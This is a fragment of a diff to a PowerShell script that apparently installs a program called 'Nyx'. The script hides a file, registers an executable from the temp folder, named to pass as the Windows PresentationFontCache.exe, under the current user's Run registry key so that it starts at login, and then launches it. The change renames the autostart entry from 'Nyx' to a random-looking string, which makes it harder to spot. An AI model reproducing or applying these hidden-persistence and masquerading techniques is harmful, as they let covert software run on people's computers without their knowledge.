@@ -24,7 +24,7 @@ $FILE.attributes='Hidden'
 
 # Add Nyx to startup processes
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
--Name "Nyx" `
+-Name "VCEC342Z" `
 -Value "$env:TEMP\PresentationFontCache.exe"
 
 # Run Nyx
